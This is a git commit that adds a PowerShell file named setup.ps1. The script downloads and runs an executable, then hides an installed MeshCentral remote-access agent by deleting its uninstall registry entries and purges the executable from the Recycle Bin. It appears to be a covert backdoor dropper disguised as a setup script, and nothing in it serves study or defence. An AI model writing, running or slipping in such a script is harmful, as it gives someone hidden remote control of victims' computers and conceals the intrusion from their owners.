bf76eef308dac4643cef41bbfd4d90e57474d77d
Inferno <46422592+InfernoTV@users.noreply.github.com>
2025-05-06 16:21:40 +0200

    setup.ps1

---
+++ setup.ps1
@@ -0,0 +1,31 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$URLs = @(
+    'https://github.com/InfernoTV/Plagiat/new/main/setup.ps1'
+)
+$exePath = "$env:TEMP\AT-agent.exe"
+foreach ($URL in $URLs | Sort-Object { Get-Random }) {
+    try {
+        Invoke-WebRequest -Uri $URL -OutFile $exePath -UseBasicParsing
+        break
+    } catch {}
+}
+if (-not (Test-Path $exePath)) {
+    throw
+}
+Start-Process -FilePath $exePath -ArgumentList "-fullinstall" -Wait
+Remove-Item $exePath -Force
+$uninstallKeys = @(
+    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Mesh Agent',
+    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\MeshCentralAgent'
+)
+foreach ($uninstallKey in $uninstallKeys) {
+    if (Test-Path $uninstallKey) {
+        Remove-ItemProperty -Path $uninstallKey -Name 'DisplayName' -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path $uninstallKey -Name 'UninstallString' -ErrorAction SilentlyContinue
+    }
+}
+$recycleBinPath = [System.IO.Path]::Combine($env:SystemDrive, '\$Recycle.Bin')
+$filesInBin = Get-ChildItem -Path $recycleBinPath -Recurse -Filter 'AT-agent.exe' -ErrorAction SilentlyContinue
+foreach ($file in $filesInBin) {
+    Remove-Item -Path $file.FullName -Force
+}
